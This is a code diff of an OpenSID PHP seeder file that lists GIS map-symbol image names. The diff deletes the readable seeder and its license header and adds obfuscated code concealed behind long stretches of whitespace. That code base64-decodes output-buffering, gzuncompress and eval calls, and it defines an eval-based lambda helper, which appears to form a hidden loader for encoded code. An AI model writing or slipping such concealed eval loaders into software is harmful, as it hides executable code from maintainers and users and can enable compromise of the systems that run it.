@@ -1,689 +1,585 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/GisSimbol.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use Illuminate\Filesystem\Filesystem;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class GisSimbol extends CI_Model
-{
-    public function getData()
-    {
-        (new Filesystem())->copyDirectory(LOKASI_SIMBOL_LOKASI_DEF, LOKASI_SIMBOL_LOKASI);
 
-        return [
-            ['simbol' => 'aa_bni.png'],
-            ['simbol' => 'aa_bri.png'],
-            ['simbol' => 'aa_btn.png'],
-            ['simbol' => 'aa_btp.png'],
-            ['simbol' => 'aa_pajak.png'],
-            ['simbol' => 'aa_pdam.png'],
-            ['simbol' => 'aa_pgadai.png'],
-            ['simbol' => 'aa_pln.png'],
-            ['simbol' => 'aa_pmi.png'],
-            ['simbol' => 'aa_polisi.png'],
-            ['simbol' => 'aa_prtmn.png'],
-            ['simbol' => 'aa_pskms.png'],
-            ['simbol' => 'aa_ptrns.png'],
-            ['simbol' => 'aa_pwbdh.png'],
-            ['simbol' => 'aa_pwhnd.png'],
-            ['simbol' => 'aa_pwisl.png'],
-            ['simbol' => 'aa_pwkhc.png'],
-            ['simbol' => 'aa_pwkrs.png'],
-            ['simbol' => 'aa_sk.png'],
-            ['simbol' => 'aa_skagm.png'],
-            ['simbol' => 'aa_skint.png'],
-            ['simbol' => 'aa_sksd.png'],
-            ['simbol' => 'aa_sksma.png'],
-            ['simbol' => 'aa_sksmp.png'],
-            ['simbol' => 'aa_sktk.png'],
-            ['simbol' => 'aa_tniad.png'],
-            ['simbol' => 'aa_tnial.png'],
-            ['simbol' => 'aa_tniau.png'],
-            ['simbol' => 'accident.png'],
-            ['simbol' => 'accident_2.png'],
-            ['simbol' => 'administration.png'],
-            ['simbol' => 'administration_2.png'],
-            ['simbol' => 'aestheticscenter.png'],
-            ['simbol' => 'agriculture.png'],
-            ['simbol' => 'agriculture2.png'],
-            ['simbol' => 'agriculture3.png'],
-            ['simbol' => 'agriculture4.png'],
-            ['simbol' => 'aircraft-small.png'],
-            ['simbol' => 'airplane-sport.png'],
-            ['simbol' => 'airplane-tourism.png'],
-            ['simbol' => 'airport-apron.png'],
-            ['simbol' => 'airport-runway.png'],
-            ['simbol' => 'airport-terminal.png'],
-            ['simbol' => 'airport.png'],
-            ['simbol' => 'airport_2.png'],
-            ['simbol' => 'amphitheater-tourism.png'],
-            ['simbol' => 'amphitheater.png'],
-            ['simbol' => 'ancientmonument.png'],
-            ['simbol' => 'ancienttemple.png'],
-            ['simbol' => 'ancienttempleruin.png'],
-            ['simbol' => 'animals.png'],
-            ['simbol' => 'animals_2.png'],
-            ['simbol' => 'anniversary.png'],
-            ['simbol' => 'apartment.png'],
-            ['simbol' => 'apartment_2.png'],
-            ['simbol' => 'aquarium.png'],
-            ['simbol' => 'arch.png'],
-            ['simbol' => 'archery.png'],
-            ['simbol' => 'artgallery.png'],
-            ['simbol' => 'atm.png'],
-            ['simbol' => 'atv.png'],
-            ['simbol' => 'audio.png'],
-            ['simbol' => 'australianfootball.png'],
-            ['simbol' => 'bags.png'],
-            ['simbol' => 'bank.png'],
-            ['simbol' => 'bankeuro.png'],
-            ['simbol' => 'bankpound.png'],
-            ['simbol' => 'bank_2.png'],
-            ['simbol' => 'bar.png'],
-            ['simbol' => 'bar_2.png'],
-            ['simbol' => 'baseball.png'],
-            ['simbol' => 'basketball.png'],
-            ['simbol' => 'baskteball2.png'],
-            ['simbol' => 'beach.png'],
-            ['simbol' => 'beach_2.png'],
-            ['simbol' => 'beautiful.png'],
-            ['simbol' => 'beautiful_2.png'],
-            ['simbol' => 'bench.png'],
-            ['simbol' => 'biblio.png'],
-            ['simbol' => 'bicycleparking.png'],
-            ['simbol' => 'bigcity.png'],
-            ['simbol' => 'billiard.png'],
-            ['simbol' => 'bobsleigh.png'],
-            ['simbol' => 'bomb.png'],
-            ['simbol' => 'bookstore.png'],
-            ['simbol' => 'bowling.png'],
-            ['simbol' => 'bowling_2.png'],
-            ['simbol' => 'boxing.png'],
-            ['simbol' => 'bread.png'],
-            ['simbol' => 'bread_2.png'],
-            ['simbol' => 'bridge.png'],
-            ['simbol' => 'bridgemodern.png'],
-            ['simbol' => 'bullfight.png'],
-            ['simbol' => 'bungalow.png'],
-            ['simbol' => 'bus.png'],
-            ['simbol' => 'bus_2.png'],
-            ['simbol' => 'butcher.png'],
-            ['simbol' => 'cabin.png'],
-            ['simbol' => 'cablecar.png'],
-            ['simbol' => 'camping.png'],
-            ['simbol' => 'campingsite.png'],
-            ['simbol' => 'camping_2.png'],
-            ['simbol' => 'canoe.png'],
-            ['simbol' => 'car.png'],
-            ['simbol' => 'carrental.png'],
-            ['simbol' => 'carrepair.png'],
-            ['simbol' => 'carrepair_2.png'],
-            ['simbol' => 'carwash.png'],
-            ['simbol' => 'car_2.png'],
-            ['simbol' => 'casino.png'],
-            ['simbol' => 'casino_2.png'],
-            ['simbol' => 'castle.png'],
-            ['simbol' => 'cathedral.png'],
-            ['simbol' => 'cathedral2.png'],
-            ['simbol' => 'cave.png'],
-            ['simbol' => 'cemetary.png'],
-            ['simbol' => 'chapel.png'],
-            ['simbol' => 'church.png'],
-            ['simbol' => 'church2.png'],
-            ['simbol' => 'church_2.png'],
-            ['simbol' => 'cinema.png'],
-            ['simbol' => 'cinema_2.png'],
-            ['simbol' => 'circus.png'],
-            ['simbol' => 'citysquare.png'],
-            ['simbol' => 'climbing.png'],
-            ['simbol' => 'clothes-female.png'],
-            ['simbol' => 'clothes-male.png'],
-            ['simbol' => 'clothes.png'],
-            ['simbol' => 'clothes_2.png'],
-            ['simbol' => 'clouds.png'],
-            ['simbol' => 'cloudsun.png'],
-            ['simbol' => 'cloudsun_2.png'],
-            ['simbol' => 'clouds_2.png'],
-            ['simbol' => 'club.png'],
-            ['simbol' => 'club_2.png'],
-            ['simbol' => 'cluster.png'],
-            ['simbol' => 'cluster2.png'],
-            ['simbol' => 'cluster3.png'],
-            ['simbol' => 'cluster4.png'],
-            ['simbol' => 'cluster5.png'],
-            ['simbol' => 'cocktail.png'],
-            ['simbol' => 'coffee.png'],
-            ['simbol' => 'coffee_2.png'],
-            ['simbol' => 'communitycentre.png'],
-            ['simbol' => 'company.png'],
-            ['simbol' => 'company_2.png'],
-            ['simbol' => 'computer.png'],
-            ['simbol' => 'computer_2.png'],
-            ['simbol' => 'concessionaire.png'],
-            ['simbol' => 'conference.png'],
-            ['simbol' => 'construction.png'],
-            ['simbol' => 'convenience.png'],
-            ['simbol' => 'convent.png'],
-            ['simbol' => 'corral.png'],
-            ['simbol' => 'country.png'],
-            ['simbol' => 'court.png'],
-            ['simbol' => 'cricket.png'],
-            ['simbol' => 'cross.png'],
-            ['simbol' => 'crossingguard.png'],
-            ['simbol' => 'cruise.png'],
-            ['simbol' => 'currencyexchange.png'],
-            ['simbol' => 'customs.png'],
-            ['simbol' => 'cycling.png'],
-            ['simbol' => 'cyclingfeedarea.png'],
-            ['simbol' => 'cyclingmountain1.png'],
-            ['simbol' => 'cyclingmountain2.png'],
-            ['simbol' => 'cyclingmountain3.png'],
-            ['simbol' => 'cyclingmountain4.png'],
-            ['simbol' => 'cyclingmountainnotrated.png'],
-            ['simbol' => 'cyclingsport.png'],
-            ['simbol' => 'cyclingsprint.png'],
-            ['simbol' => 'cyclinguncategorized.png'],
-            ['simbol' => 'cycling_2.png'],
-            ['simbol' => 'dam.png'],
-            ['simbol' => 'dancinghall.png'],
-            ['simbol' => 'dates.png'],
-            ['simbol' => 'dates_2.png'],
-            ['simbol' => 'daycare.png'],
-            ['simbol' => 'days-dim.png'],
-            ['simbol' => 'days-dom.png'],
-            ['simbol' => 'days-jeu.png'],
-            ['simbol' => 'days-jue.png'],
-            ['simbol' => 'days-lun.png'],
-            ['simbol' => 'days-mar.png'],
-            ['simbol' => 'days-mer.png'],
-            ['simbol' => 'days-mie.png'],
-            ['simbol' => 'days-qua.png'],
-            ['simbol' => 'days-qui.png'],
-            ['simbol' => 'days-sab.png'],
-            ['simbol' => 'days-sam.png'],
-            ['simbol' => 'days-seg.png'],
-            ['simbol' => 'days-sex.png'],
-            ['simbol' => 'days-ter.png'],
-            ['simbol' => 'days-ven.png'],
-            ['simbol' => 'days-vie.png'],
-            ['simbol' => 'default.png'],
-            ['simbol' => 'dentist.png'],
-            ['simbol' => 'deptstore.png'],
-            ['simbol' => 'disability.png'],
-            ['simbol' => 'disability_2.png'],
-            ['simbol' => 'disabledparking.png'],
-            ['simbol' => 'diving.png'],
-            ['simbol' => 'doctor.png'],
-            ['simbol' => 'doctor_2.png'],
-            ['simbol' => 'dog-leash.png'],
-            ['simbol' => 'dog-offleash.png'],
-            ['simbol' => 'door.png'],
-            ['simbol' => 'down.png'],
-            ['simbol' => 'downleft.png'],
-            ['simbol' => 'downright.png'],
-            ['simbol' => 'downthenleft.png'],
-            ['simbol' => 'downthenright.png'],
-            ['simbol' => 'drinkingfountain.png'],
-            ['simbol' => 'drinkingwater.png'],
-            ['simbol' => 'drugs.png'],
-            ['simbol' => 'drugs_2.png'],
-            ['simbol' => 'elevator.png'],
-            ['simbol' => 'embassy.png'],
-            ['simbol' => 'emblem-art.png'],
-            ['simbol' => 'emblem-photos.png'],
-            ['simbol' => 'entrance.png'],
-            ['simbol' => 'escalator-down.png'],
-            ['simbol' => 'escalator-up.png'],
-            ['simbol' => 'exit.png'],
-            ['simbol' => 'expert.png'],
-            ['simbol' => 'explosion.png'],
-            ['simbol' => 'face-devilish.png'],
-            ['simbol' => 'face-embarrassed.png'],
-            ['simbol' => 'factory.png'],
-            ['simbol' => 'factory_2.png'],
-            ['simbol' => 'fallingrocks.png'],
-            ['simbol' => 'family.png'],
-            ['simbol' => 'farm.png'],
-            ['simbol' => 'farm_2.png'],
-            ['simbol' => 'fastfood.png'],
-            ['simbol' => 'fastfood_2.png'],
-            ['simbol' => 'festival-itinerant.png'],
-            ['simbol' => 'festival.png'],
-            ['simbol' => 'findajob.png'],
-            ['simbol' => 'findjob.png'],
-            ['simbol' => 'findjob_2.png'],
-            ['simbol' => 'fire-extinguisher.png'],
-            ['simbol' => 'fire.png'],
-            ['simbol' => 'firemen.png'],
-            ['simbol' => 'firemen_2.png'],
-            ['simbol' => 'fireworks.png'],
-            ['simbol' => 'firstaid.png'],
-            ['simbol' => 'fishing.png'],
-            ['simbol' => 'fishingshop.png'],
-            ['simbol' => 'fishing_2.png'],
-            ['simbol' => 'fitnesscenter.png'],
-            ['simbol' => 'fjord.png'],
-            ['simbol' => 'flood.png'],
-            ['simbol' => 'flowers.png'],
-            ['simbol' => 'flowers_2.png'],
-            ['simbol' => 'followpath.png'],
-            ['simbol' => 'foodtruck.png'],
-            ['simbol' => 'forest.png'],
-            ['simbol' => 'fortress.png'],
-            ['simbol' => 'fossils.png'],
-            ['simbol' => 'fountain.png'],
-            ['simbol' => 'friday.png'],
-            ['simbol' => 'friday_2.png'],
-            ['simbol' => 'friends.png'],
-            ['simbol' => 'friends_2.png'],
-            ['simbol' => 'garden.png'],
-            ['simbol' => 'gateswalls.png'],
-            ['simbol' => 'gazstation.png'],
-            ['simbol' => 'gazstation_2.png'],
-            ['simbol' => 'geyser.png'],
-            ['simbol' => 'gifts.png'],
-            ['simbol' => 'girlfriend.png'],
-            ['simbol' => 'girlfriend_2.png'],
-            ['simbol' => 'glacier.png'],
-            ['simbol' => 'golf.png'],
-            ['simbol' => 'golf_2.png'],
-            ['simbol' => 'gondola.png'],
-            ['simbol' => 'gourmet.png'],
-            ['simbol' => 'grocery.png'],
-            ['simbol' => 'gun.png'],
-            ['simbol' => 'gym.png'],
-            ['simbol' => 'hairsalon.png'],
-            ['simbol' => 'handball.png'],
-            ['simbol' => 'hanggliding.png'],
-            ['simbol' => 'hats.png'],
-            ['simbol' => 'headstone.png'],
-            ['simbol' => 'headstonejewish.png'],
-            ['simbol' => 'helicopter.png'],
-            ['simbol' => 'highway.png'],
-            ['simbol' => 'highway_2.png'],
-            ['simbol' => 'hiking-tourism.png'],
-            ['simbol' => 'hiking.png'],
-            ['simbol' => 'hiking_2.png'],
-            ['simbol' => 'historicalquarter.png'],
-            ['simbol' => 'home.png'],
-            ['simbol' => 'home_2.png'],
-            ['simbol' => 'horseriding.png'],
-            ['simbol' => 'horseriding_2.png'],
-            ['simbol' => 'hospital.png'],
-            ['simbol' => 'hospital_2.png'],
-            ['simbol' => 'hostel.png'],
-            ['simbol' => 'hotairballoon.png'],
-            ['simbol' => 'hotel.png'],
-            ['simbol' => 'hotel1star.png'],
-            ['simbol' => 'hotel2stars.png'],
-            ['simbol' => 'hotel3stars.png'],
-            ['simbol' => 'hotel4stars.png'],
-            ['simbol' => 'hotel5stars.png'],
-            ['simbol' => 'hotel_2.png'],
-            ['simbol' => 'house.png'],
-            ['simbol' => 'hunting.png'],
-            ['simbol' => 'icecream.png'],
-            ['simbol' => 'icehockey.png'],
-            ['simbol' => 'iceskating.png'],
-            ['simbol' => 'im-user.png'],
-            ['simbol' => 'index.html'],
-            ['simbol' => 'info.png'],
-            ['simbol' => 'info_2.png'],
-            ['simbol' => 'jewelry.png'],
-            ['simbol' => 'jewishquarter.png'],
-            ['simbol' => 'jogging.png'],
-            ['simbol' => 'judo.png'],
-            ['simbol' => 'justice.png'],
-            ['simbol' => 'justice_2.png'],
-            ['simbol' => 'karate.png'],
-            ['simbol' => 'karting.png'],
-            ['simbol' => 'kayak.png'],
-            ['simbol' => 'laboratory.png'],
-            ['simbol' => 'lake.png'],
-            ['simbol' => 'laundromat.png'],
-            ['simbol' => 'left.png'],
-            ['simbol' => 'leftthendown.png'],
-            ['simbol' => 'leftthenup.png'],
-            ['simbol' => 'library.png'],
-            ['simbol' => 'library_2.png'],
-            ['simbol' => 'lighthouse.png'],
-            ['simbol' => 'liquor.png'],
-            ['simbol' => 'lock.png'],
-            ['simbol' => 'lockerrental.png'],
-            ['simbol' => 'magicshow.png'],
-            ['simbol' => 'mainroad.png'],
-            ['simbol' => 'massage.png'],
-            ['simbol' => 'military.png'],
-            ['simbol' => 'military_2.png'],
-            ['simbol' => 'mine.png'],
-            ['simbol' => 'mobilephonetower.png'],
-            ['simbol' => 'modernmonument.png'],
-            ['simbol' => 'moderntower.png'],
-            ['simbol' => 'monastery.png'],
-            ['simbol' => 'monday.png'],
-            ['simbol' => 'monday_2.png'],
-            ['simbol' => 'monument.png'],
-            ['simbol' => 'mosque.png'],
-            ['simbol' => 'motorbike.png'],
-            ['simbol' => 'motorcycle.png'],
-            ['simbol' => 'movierental.png'],
-            ['simbol' => 'museum-archeological.png'],
-            ['simbol' => 'museum-art.png'],
-            ['simbol' => 'museum-crafts.png'],
-            ['simbol' => 'museum-historical.png'],
-            ['simbol' => 'museum-naval.png'],
-            ['simbol' => 'museum-science.png'],
-            ['simbol' => 'museum-war.png'],
-            ['simbol' => 'museum.png'],
-            ['simbol' => 'museum_2.png'],
-            ['simbol' => 'music-classical.png'],
-            ['simbol' => 'music-hiphop.png'],
-            ['simbol' => 'music-live.png'],
-            ['simbol' => 'music-rock.png'],
-            ['simbol' => 'music.png'],
-            ['simbol' => 'music_2.png'],
-            ['simbol' => 'nanny.png'],
-            ['simbol' => 'newsagent.png'],
-            ['simbol' => 'nordicski.png'],
-            ['simbol' => 'nursery.png'],
-            ['simbol' => 'observatory.png'],
-            ['simbol' => 'oilpumpjack.png'],
-            ['simbol' => 'olympicsite.png'],
-            ['simbol' => 'ophthalmologist.png'],
-            ['simbol' => 'pagoda.png'],
-            ['simbol' => 'paint.png'],
-            ['simbol' => 'palace.png'],
-            ['simbol' => 'panoramic.png'],
-            ['simbol' => 'panoramic180.png'],
-            ['simbol' => 'park-urban.png'],
-            ['simbol' => 'park.png'],
-            ['simbol' => 'parkandride.png'],
-            ['simbol' => 'parking.png'],
-            ['simbol' => 'parking_2.png'],
-            ['simbol' => 'park_2.png'],
-            ['simbol' => 'party.png'],
-            ['simbol' => 'patisserie.png'],
-            ['simbol' => 'pedestriancrossing.png'],
-            ['simbol' => 'pend.png'],
-            ['simbol' => 'pens.png'],
-            ['simbol' => 'perfumery.png'],
-            ['simbol' => 'personal.png'],
-            ['simbol' => 'personalwatercraft.png'],
-            ['simbol' => 'petroglyphs.png'],
-            ['simbol' => 'pets.png'],
-            ['simbol' => 'phones.png'],
-            ['simbol' => 'photo.png'],
-            ['simbol' => 'photodown.png'],
-            ['simbol' => 'photodownleft.png'],
-            ['simbol' => 'photodownright.png'],
-            ['simbol' => 'photography.png'],
-            ['simbol' => 'photoleft.png'],
-            ['simbol' => 'photoright.png'],
-            ['simbol' => 'photoup.png'],
-            ['simbol' => 'photoupleft.png'],
-            ['simbol' => 'photoupright.png'],
-            ['simbol' => 'picnic.png'],
-            ['simbol' => 'pizza.png'],
-            ['simbol' => 'pizza_2.png'],
-            ['simbol' => 'places-unvisited.png'],
-            ['simbol' => 'places-visited.png'],
-            ['simbol' => 'planecrash.png'],
-            ['simbol' => 'playground.png'],
-            ['simbol' => 'playground_2.png'],
-            ['simbol' => 'poker.png'],
-            ['simbol' => 'poker_2.png'],
-            ['simbol' => 'police.png'],
-            ['simbol' => 'police2.png'],
-            ['simbol' => 'police_2.png'],
-            ['simbol' => 'pool-indoor.png'],
-            ['simbol' => 'pool.png'],
-            ['simbol' => 'pool_2.png'],
-            ['simbol' => 'port.png'],
-            ['simbol' => 'port_2.png'],
-            ['simbol' => 'postal.png'],
-            ['simbol' => 'postal_2.png'],
-            ['simbol' => 'powerlinepole.png'],
-            ['simbol' => 'powerplant.png'],
-            ['simbol' => 'powersubstation.png'],
-            ['simbol' => 'prison.png'],
-            ['simbol' => 'protectedart.png'],
-            ['simbol' => 'racing.png'],
-            ['simbol' => 'radiation.png'],
-            ['simbol' => 'rain_2.png'],
-            ['simbol' => 'rain_3.png'],
-            ['simbol' => 'rattlesnake.png'],
-            ['simbol' => 'realestate.png'],
-            ['simbol' => 'realestate_2.png'],
-            ['simbol' => 'recycle.png'],
-            ['simbol' => 'recycle_2.png'],
-            ['simbol' => 'recycle_3.png'],
-            ['simbol' => 'regroup.png'],
-            ['simbol' => 'regulier.png'],
-            ['simbol' => 'resort.png'],
-            ['simbol' => 'restaurant-barbecue.png'],
-            ['simbol' => 'restaurant-buffet.png'],
-            ['simbol' => 'restaurant-fish.png'],
-            ['simbol' => 'restaurant-romantic.png'],
-            ['simbol' => 'restaurant.png'],
-            ['simbol' => 'restaurantafrican.png'],
-            ['simbol' => 'restaurantchinese.png'],
-            ['simbol' => 'restaurantchinese_2.png'],
-            ['simbol' => 'restaurantfishchips.png'],
-            ['simbol' => 'restaurantgourmet.png'],
-            ['simbol' => 'restaurantgreek.png'],
-            ['simbol' => 'restaurantindian.png'],
-            ['simbol' => 'restaurantitalian.png'],
-            ['simbol' => 'restaurantjapanese.png'],
-            ['simbol' => 'restaurantjapanese_2.png'],
-            ['simbol' => 'restaurantkebab.png'],
-            ['simbol' => 'restaurantkorean.png'],
-            ['simbol' => 'restaurantmediterranean.png'],
-            ['simbol' => 'restaurantmexican.png'],
-            ['simbol' => 'restaurantthai.png'],
-            ['simbol' => 'restaurantturkish.png'],
-            ['simbol' => 'restaurant_2.png'],
-            ['simbol' => 'revolution.png'],
-            ['simbol' => 'right.png'],
-            ['simbol' => 'rightthendown.png'],
-            ['simbol' => 'rightthenup.png'],
-            ['simbol' => 'riparian.png'],
-            ['simbol' => 'ropescourse.png'],
-            ['simbol' => 'rowboat.png'],
-            ['simbol' => 'rugby.png'],
-            ['simbol' => 'ruins.png'],
-            ['simbol' => 'sailboat-sport.png'],
-            ['simbol' => 'sailboat-tourism.png'],
-            ['simbol' => 'sailboat.png'],
-            ['simbol' => 'salle-fete.png'],
-            ['simbol' => 'satursday.png'],
-            ['simbol' => 'satursday_2.png'],
-            ['simbol' => 'sauna.png'],
-            ['simbol' => 'school.png'],
-            ['simbol' => 'school_2.png'],
-            ['simbol' => 'schrink.png'],
-            ['simbol' => 'schrink_2.png'],
-            ['simbol' => 'sciencecenter.png'],
-            ['simbol' => 'seals.png'],
-            ['simbol' => 'seniorsite.png'],
-            ['simbol' => 'shadow.png'],
-            ['simbol' => 'shelter-picnic.png'],
-            ['simbol' => 'shelter-sleeping.png'],
-            ['simbol' => 'shoes.png'],
-            ['simbol' => 'shoes_2.png'],
-            ['simbol' => 'shoppingmall.png'],
-            ['simbol' => 'shore.png'],
-            ['simbol' => 'shower.png'],
-            ['simbol' => 'sight.png'],
-            ['simbol' => 'skateboarding.png'],
-            ['simbol' => 'skiing.png'],
-            ['simbol' => 'skiing_2.png'],
-            ['simbol' => 'skijump.png'],
-            ['simbol' => 'skilift.png'],
-            ['simbol' => 'smallcity.png'],
-            ['simbol' => 'smokingarea.png'],
-            ['simbol' => 'sneakers.png'],
-            ['simbol' => 'snow.png'],
-            ['simbol' => 'snowboarding.png'],
-            ['simbol' => 'snowmobiling.png'],
-            ['simbol' => 'snowshoeing.png'],
-            ['simbol' => 'soccer.png'],
-            ['simbol' => 'soccer2.png'],
-            ['simbol' => 'soccer_2.png'],
-            ['simbol' => 'spaceport.png'],
-            ['simbol' => 'spectacle.png'],
-            ['simbol' => 'speed100.png'],
-            ['simbol' => 'speed110.png'],
-            ['simbol' => 'speed120.png'],
-            ['simbol' => 'speed130.png'],
-            ['simbol' => 'speed20.png'],
-            ['simbol' => 'speed30.png'],
-            ['simbol' => 'speed40.png'],
-            ['simbol' => 'speed50.png'],
-            ['simbol' => 'speed60.png'],
-            ['simbol' => 'speed70.png'],
-            ['simbol' => 'speed80.png'],
-            ['simbol' => 'speed90.png'],
-            ['simbol' => 'speedhump.png'],
-            ['simbol' => 'spelunking.png'],
-            ['simbol' => 'stadium.png'],
-            ['simbol' => 'statue.png'],
-            ['simbol' => 'steamtrain.png'],
-            ['simbol' => 'stop.png'],
-            ['simbol' => 'stoplight.png'],
-            ['simbol' => 'stoplight_2.png'],
-            ['simbol' => 'strike.png'],
-            ['simbol' => 'strike1.png'],
-            ['simbol' => 'subway.png'],
-            ['simbol' => 'sun.png'],
-            ['simbol' => 'sunday.png'],
-            ['simbol' => 'sunday_2.png'],
-            ['simbol' => 'sun_2.png'],
-            ['simbol' => 'supermarket.png'],
-            ['simbol' => 'supermarket_2.png'],
-            ['simbol' => 'surfing.png'],
-            ['simbol' => 'suv.png'],
-            ['simbol' => 'synagogue.png'],
-            ['simbol' => 'tailor.png'],
-            ['simbol' => 'tapas.png'],
-            ['simbol' => 'taxi.png'],
-            ['simbol' => 'taxiway.png'],
-            ['simbol' => 'taxi_2.png'],
-            ['simbol' => 'teahouse.png'],
-            ['simbol' => 'telephone.png'],
-            ['simbol' => 'templehindu.png'],
-            ['simbol' => 'tennis.png'],
-            ['simbol' => 'tennis2.png'],
-            ['simbol' => 'tennis_2.png'],
-            ['simbol' => 'tent.png'],
-            ['simbol' => 'terrace.png'],
-            ['simbol' => 'text.png'],
-            ['simbol' => 'textiles.png'],
-            ['simbol' => 'theater.png'],
-            ['simbol' => 'theater_2.png'],
-            ['simbol' => 'themepark.png'],
-            ['simbol' => 'thunder.png'],
-            ['simbol' => 'thunder_2.png'],
-            ['simbol' => 'thursday.png'],
-            ['simbol' => 'thursday_2.png'],
-            ['simbol' => 'toilets.png'],
-            ['simbol' => 'toilets_2.png'],
-            ['simbol' => 'tollstation.png'],
-            ['simbol' => 'tools.png'],
-            ['simbol' => 'tower.png'],
-            ['simbol' => 'toys.png'],
-            ['simbol' => 'toys_2.png'],
-            ['simbol' => 'trafficenforcementcamera.png'],
-            ['simbol' => 'train.png'],
-            ['simbol' => 'train_2.png'],
-            ['simbol' => 'tram.png'],
-            ['simbol' => 'trash.png'],
-            ['simbol' => 'truck.png'],
-            ['simbol' => 'truck_2.png'],
-            ['simbol' => 'tuesday.png'],
-            ['simbol' => 'tuesday_2.png'],
-            ['simbol' => 'tunnel.png'],
-            ['simbol' => 'turnleft.png'],
-            ['simbol' => 'turnright.png'],
-            ['simbol' => 'university.png'],
-            ['simbol' => 'university_2.png'],
-            ['simbol' => 'unnamed.png'],
-            ['simbol' => 'up.png'],
-            ['simbol' => 'upleft.png'],
-            ['simbol' => 'upright.png'],
-            ['simbol' => 'upthenleft.png'],
-            ['simbol' => 'upthenright.png'],
-            ['simbol' => 'usfootball.png'],
-            ['simbol' => 'vespa.png'],
-            ['simbol' => 'vet.png'],
-            ['simbol' => 'video.png'],
-            ['simbol' => 'videogames.png'],
-            ['simbol' => 'videogames_2.png'],
-            ['simbol' => 'villa.png'],
-            ['simbol' => 'waitingroom.png'],
-            ['simbol' => 'water.png'],
-            ['simbol' => 'waterfall.png'],
-            ['simbol' => 'watermill.png'],
-            ['simbol' => 'waterpark.png'],
-            ['simbol' => 'waterskiing.png'],
-            ['simbol' => 'watertower.png'],
-            ['simbol' => 'waterwell.png'],
-            ['simbol' => 'waterwellpump.png'],
-            ['simbol' => 'wedding.png'],
-            ['simbol' => 'wednesday.png'],
-            ['simbol' => 'wednesday_2.png'],
-            ['simbol' => 'wetland.png'],
-            ['simbol' => 'white1.png'],
-            ['simbol' => 'white20.png'],
-            ['simbol' => 'wifi.png'],
-            ['simbol' => 'wifi_2.png'],
-            ['simbol' => 'windmill.png'],
-            ['simbol' => 'windsurfing.png'],
-            ['simbol' => 'windturbine.png'],
-            ['simbol' => 'winery.png'],
-            ['simbol' => 'wineyard.png'],
-            ['simbol' => 'workoffice.png'],
-            ['simbol' => 'world.png'],
-            ['simbol' => 'worldheritagesite.png'],
-            ['simbol' => 'yoga.png'],
-            ['simbol' => 'youthhostel.png'],
-            ['simbol' => 'zipline.png'],
-            ['simbol' => 'zoo.png'],
-            ['simbol' => 'zoo_2.png'],
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    